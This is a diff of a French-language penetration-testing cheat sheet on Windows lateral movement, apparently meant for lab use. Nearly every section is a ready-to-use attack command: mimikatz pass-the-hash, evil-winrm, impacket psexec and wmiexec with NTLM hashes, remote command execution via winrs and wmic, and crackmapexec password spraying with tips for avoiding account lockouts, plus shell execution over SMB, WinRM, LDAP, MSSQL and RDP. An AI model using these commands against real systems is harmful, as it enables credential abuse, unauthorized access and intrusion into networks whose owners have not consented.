@@ -15,6 +15,7 @@ Référence des accès distants et protocoles entre hôtes Windows.
 
 ```powershell
 powershell -ExecutionPolicy Bypass -File [script].ps1
+
 ```
 
 
@@ -25,6 +26,7 @@ mimikatz # sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<NTLM_hash> /ru
 
 # Vous pouvez alors exécuter des commandes dans la session PowerShell comme si vous étiez connecté comme l'autre utilisateur, par exemple ici, nous passons à un autre système comme l'autre utilisateur et exécutant un shell:
 .\PsExec.exe \\<target_system> cmd
+
 ```
 
 
@@ -37,6 +39,7 @@ Observer les permissions et la configuration de Windows.
 
 ```bash
 evil-winrm -u <username> -p <password> -i <target_ip>
+
 ```
 
 
@@ -45,6 +48,7 @@ evil-winrm -u <username> -p <password> -i <target_ip>
 evil-winrm -i <target_ip> -u <username> -H <LM_hash>:<NTLM_hash>
 # or
 evil-winrm -i <target_ip> -u <username> -H 00000000000000000000000000000000:<NTLM_hash>
+
 ```
 
 
@@ -55,6 +59,7 @@ evil-winrm -i <target_ip> -u <username> -H 00000000000000000000000000000000:<NTL
 
 ```bash
 impacket-psexec <username>:<password>@<target_ip>
+
 ```
 
 
@@ -62,6 +67,7 @@ impacket-psexec <username>:<password>@<target_ip>
 impacket-psexec <username>@<target_ip> -hashes <LM_hash>:<NTLM_hash>
 # or
 impacket-psexec <username>@<target_ip> -hashes 00000000000000000000000000000000:<NTLM_hash>
+
 ```
 
 
@@ -72,6 +78,7 @@ impacket-psexec <username>@<target_ip> -hashes 00000000000000000000000000000000:
 
 ```bash
 impacket-wmiexec <username>:<password>@<target_ip>
+
 ```
 
 
@@ -79,6 +86,7 @@ impacket-wmiexec <username>:<password>@<target_ip>
 impacket-wmiexec -hashes <LM_hash>:<NTLM_hash> <username>@<target_ip>
 # or
 impacket-wmiexec -hashes 00000000000000000000000000000000:<NTLM_hash> <username>@<target_ip>
+
 ```
 
 
@@ -94,6 +102,7 @@ Observer les permissions et la configuration de Windows.
 
 ```powershell
 Get-ItemProperty -Path "HKLM:\Software\Microsoft\OLE" -Name "DCOMServer"
+
 ```
 
 
@@ -111,6 +120,7 @@ $secureString = ConvertTo-SecureString $password -AsPlaintext -Force
 $credential = New-Object System.Management.Automation.PSCredential($username, $secureString)
 
 Invoke-Command -ComputerName $targetIP -Credential $credential -ScriptBlock { ipconfig }
+
 ```
 
 
@@ -124,6 +134,7 @@ Invoke-Command -ComputerName $targetIP -Credential $credential -ScriptBlock { ip
 wmiexec.py <domain>/<username>:<password>@<target_ip>
 # or
 wmiexec.py <domain>/<username>@<target_ip> -hashes <LM_hash>:<NTLM_hash>
+
 ```
 
 
@@ -134,6 +145,7 @@ wmiexec.py <domain>/<username>@<target_ip> -hashes <LM_hash>:<NTLM_hash>
 
 ```bash
 psexec.exe \\<target_ip> -u <username> -p <password> cmd
+
 ```
 
 
@@ -150,6 +162,7 @@ $password = '<password>';
 $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
 $credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
 New-PSSession -ComputerName <target_ip> -Credential $credential;
+
 ```
 
 
@@ -160,6 +173,7 @@ New-PSSession -ComputerName <target_ip> -Credential $credential;
 
 ```powershell
 winrs -r:<target_ip> -u:<username> -p:<password> "<command>"
+
 ```
 
 
@@ -170,6 +184,7 @@ winrs -r:<target_ip> -u:<username> -p:<password> "<command>"
 
 ```powershell
 wmic /node:<target_ip> /user:<username> /password:<password> process call create "<command>"
+
 ```
 
 
@@ -178,7 +193,7 @@ wmic /node:<target_ip> /user:<username> /password:<password> process call create
 Vérifier les comptes, les secrets et les mécanismes d'authentification.
 
 
-### Tips for Credential Spraying
+### Précautions lors du password spraying
 
 Vérifier les comptes, les secrets et les mécanismes d'authentification.
 
@@ -198,6 +213,7 @@ crackmapexec smb <DOMAIN_IP> -d <DOMAIN_NAME> -u users.txt -p passwords.txt --sp
 
 # Tester plusieurs mots de passe avec une limite maximale de retraits pour éviter les lockouts
 crackmapexec smb <TARGET_IP> -u users.txt -p passwords.txt --max-retries 3
+
 ```
 
 
@@ -206,6 +222,7 @@ crackmapexec smb <TARGET_IP> -u users.txt -p passwords.txt --max-retries 3
 ```bash
 # Utilisez l'option --target de CrackMapExec pour réduire la focalisation
 crackmapexec smb <TARGET_IP> --target-ips subdomains.txt -u users.txt -p passwords.txt
+
 ```
 
 
@@ -216,22 +233,30 @@ crackmapexec smb <TARGET_IP> --target-ips subdomains.txt -u users.txt -p passwor
 
 
 ```bash
+# Vérifier l'accès SMB
 crackmapexec smb <TARGET_IP> -u <USERNAME> -p <PASSWORD> -d <DOMAIN_NAME> > output.log
+
 ```
 
 
 ```bash
+# Vérifier l'accès SMB
 crackmapexec smb <IP_list>.txt -u <USERNAME> -p <PASSWORD> -d <DOMAIN_NAME>
+
 ```
 
 
 ```bash
+# Énumérer les comptes accessibles
 crackmapexec ldap <DOMAIN_CONTROLLER_IP> -u <USERNAME> -p <PASSWORD> --users
+
 ```
 
 
 ```bash
+# Examiner le service avec CrackMapExec
 crackmapexec rdp <TARGET_IP> -u users.txt -p <PASSWORD>
+
 ```
 
 
@@ -239,6 +264,7 @@ crackmapexec rdp <TARGET_IP> -u users.txt -p <PASSWORD>
 
 ```bash
 nmap -p 5985,1433,445,3389 <TARGET_IP>
+
 ```
 
 
@@ -251,6 +277,7 @@ nmap -p 5985,1433,445,3389 <TARGET_IP>
 ```bash
 # Tester les mots de passe et les hachages NTLM
 crackmapexec smb <DOMAIN_IP> -u users.txt -p passwords.txt -H hashes.txt -d <DOMAIN_NAME>
+
 ```
 
 
@@ -267,18 +294,21 @@ crackmapexec smb <DOMAIN_IP> -d <DOMAIN_NAME> -u users.txt -p <PASSWORD> --spray
 
 # Tester plusieurs mots de passe avec un délai pour éviter les lockouts
 crackmapexec smb <DOMAIN_IP> -d <DOMAIN_NAME> -u users.txt -p passwords.txt --spray --delay 5
+
 ```
 
 
 ```bash
 # Énumérer les sous-domaines avec des identifiants valides et des identifiants de test (par exemple un domaine spécifique à la station de travail, comme station de travail1.domain.com)
 crackmapexec smb <SUBDOMAIN_IP> -d <SUBDOMAIN_NAME> -u users.txt -p <PASSWORD>
+
 ```
 
 
 ```bash
 # Tester les références sur les comptes locaux qui ne font pas partie du domaine
 crackmapexec smb <IP> -u local_users.txt -p <PASSWORD> --local-auth
+
 ```
 
 
@@ -288,10 +318,11 @@ crackmapexec smb <DOMAIN_IP> -u <USERNAME> -p <PASSWORD> -d <DOMAIN_NAME> -x "wh
 
 # Avec le hash NTLM
 crackmapexec smb <DOMAIN_IP> -u <USERNAME> -H <NTLM_HASH> -d <DOMAIN_NAME> -x "whoami"
+
 ```
 
 
-### WinRM (Windows Remote Management)
+### WinRM (administration distante Windows)
 
 Observer les permissions et la configuration de Windows.
 
@@ -307,6 +338,7 @@ crackmapexec winrm <DOMAIN_CONTROLLER_IP> -u <USERNAME> -H <NTLM_HASH> -d <DOMAI
 
 # Exécuter une commande
 crackmapexec winrm <DOMAIN_CONTROLLER_IP> -u <USERNAME> -p <PASSWORD> -d <DOMAIN_NAME> -x "whoami"
+
 ```
 
 
@@ -316,6 +348,7 @@ crackmapexec winrm <SUBDOMAIN_CONTROLLER_IP> -u <USERNAME> -p <PASSWORD> -d <SUB
 
 # Avec le hash NTLM
 crackmapexec winrm <SUBDOMAIN_CONTROLLER_IP> -u <USERNAME> -H <NTLM_HASH> -d <SUBDOMAIN_NAME>
+
 ```
 
 
@@ -325,6 +358,7 @@ crackmapexec winrm <TARGET_IP> -u <LOCAL_USER> -p <PASSWORD> --local-auth
 
 # Avec le hash NTLM
 crackmapexec winrm <TARGET_IP> -u <LOCAL_USER> -H <NTLM_HASH> --local-auth
+
 ```
 
 
@@ -334,6 +368,7 @@ crackmapexec winrm <TARGET_IP> -u <USERNAME> -p <PASSWORD> -d <DOMAIN_NAME> -x "
 
 # Avec un hash NTLM
 crackmapexec winrm <TARGET_IP> -u <USERNAME> -H <NTLM_HASH> -d <DOMAIN_NAME> -x "ipconfig"
+
 ```
 
 
@@ -350,6 +385,7 @@ crackmapexec smb <DOMAIN_IP> -u <USERNAME> -p <PASSWORD> -d <DOMAIN_NAME> --exec
 
 # Gain a shell using NTLM hash
 crackmapexec smb <DOMAIN_IP> -u <USERNAME> -H <NTLM_HASH> -d <DOMAIN_NAME> --exec-method smbexec
+
 ```
 
 
@@ -359,6 +395,7 @@ crackmapexec smb <TARGET_IP> -u <USERNAME> -p <PASSWORD> -d <DOMAIN_NAME> -x "wh
 
 # Avec un hash NTLM
 crackmapexec smb <TARGET_IP> -u <USERNAME> -H <NTLM_HASH> -d <DOMAIN_NAME> -x "whoami"
+
 ```
 
 
@@ -373,6 +410,7 @@ crackmapexec smb <DOMAIN_IP> -u <USERNAME> -p <PASSWORD> -d <DOMAIN_NAME> --exec
 
 # Gain a shell using NTLM hash
 crackmapexec smb <DOMAIN_IP> -u <USERNAME> -H <NTLM_HASH> -d <DOMAIN_NAME> --exec-method wmiexec
+
 ```
 
 
@@ -389,6 +427,7 @@ crackmapexec ldap <DOMAIN_CONTROLLER_IP> -u <USERNAME> -p <PASSWORD> -d <DOMAIN_
 
 # Avec le hash NTLM
 crackmapexec ldap <DOMAIN_CONTROLLER_IP> -u <USERNAME> -H <NTLM_HASH> -d <DOMAIN_NAME>
+
 ```
 
 
@@ -398,6 +437,7 @@ crackmapexec ldap <SUBDOMAIN_CONTROLLER_IP> -u <USERNAME> -p <PASSWORD> -d <SUBD
 
 # Avec le hash NTLM
 crackmapexec ldap <SUBDOMAIN_CONTROLLER_IP> -u <USERNAME> -H <NTLM_HASH> -d <SUBDOMAIN_NAME>
+
 ```
 
 
@@ -414,6 +454,7 @@ crackmapexec mssql <DOMAIN_CONTROLLER_IP> -u <USERNAME> -p <PASSWORD> -d <DOMAIN
 
 # Avec le hash NTLM
 crackmapexec mssql <DOMAIN_CONTROLLER_IP> -u <USERNAME> -H <NTLM_HASH> -d <DOMAIN_NAME>
+
 ```
 
 
@@ -423,6 +464,7 @@ crackmapexec mssql <SUBDOMAIN_IP> -u <USERNAME> -p <PASSWORD> -d <SUBDOMAIN_NAME
 
 # Avec le hash NTLM
 crackmapexec mssql <SUBDOMAIN_IP> -u <USERNAME> -H <NTLM_HASH> -d <SUBDOMAIN_NAME>
+
 ```
 
 
@@ -432,6 +474,7 @@ crackmapexec mssql <TARGET_IP> -u <LOCAL_USER> -p <PASSWORD> --local-auth
 
 # Avec le hash NTLM
 crackmapexec mssql <TARGET_IP> -u <LOCAL_USER> -H <NTLM_HASH> --local-auth
+
 ```
 
 
@@ -446,6 +489,7 @@ crackmapexec rdp <DOMAIN_CONTROLLER_IP> -u <USERNAME> -p <PASSWORD> -d <DOMAIN_N
 
 # Avec le hash NTLM
 crackmapexec rdp <DOMAIN_CONTROLLER_IP> -u <USERNAME> -H <NTLM_HASH> -d <DOMAIN_NAME>
+
 ```
 
 
@@ -455,6 +499,7 @@ crackmapexec rdp <SUBDOMAIN_IP> -u <USERNAME> -p <PASSWORD> -d <SUBDOMAIN_NAME>
 
 # Avec le hash NTLM
 crackmapexec rdp <SUBDOMAIN_IP> -u <USERNAME> -H <NTLM_HASH> -d <SUBDOMAIN_NAME>
+
 ```
 
 
@@ -464,6 +509,7 @@ crackmapexec rdp <TARGET_IP> -u <LOCAL_USER> -p <PASSWORD> --local-auth
 
 # Avec le hash NTLM
 crackmapexec rdp <TARGET_IP> -u <LOCAL_USER> -H <NTLM_HASH> --local-auth
+
 ```
 
 
@@ -476,6 +522,7 @@ Transférer ou récupérer des fichiers dans le laboratoire.
 
 ```bash
 crackmapexec ftp <TARGET_IP> -u <USERNAME> -p <PASSWORD>
+
 ```
 
 
@@ -486,6 +533,7 @@ crackmapexec ftp <TARGET_IP> -u <USERNAME> -p <PASSWORD>
 
 ```bash
 crackmapexec ssh <TARGET_IP> -u <USERNAME> -p <PASSWORD>
+
 ```
 
 
@@ -498,6 +546,7 @@ Examiner les entrées et les réponses de l'application web.
 
 ```bash
 crackmapexec http <TARGET_IP> -u <USERNAME> -p <PASSWORD>
+
 ```
 
 ---
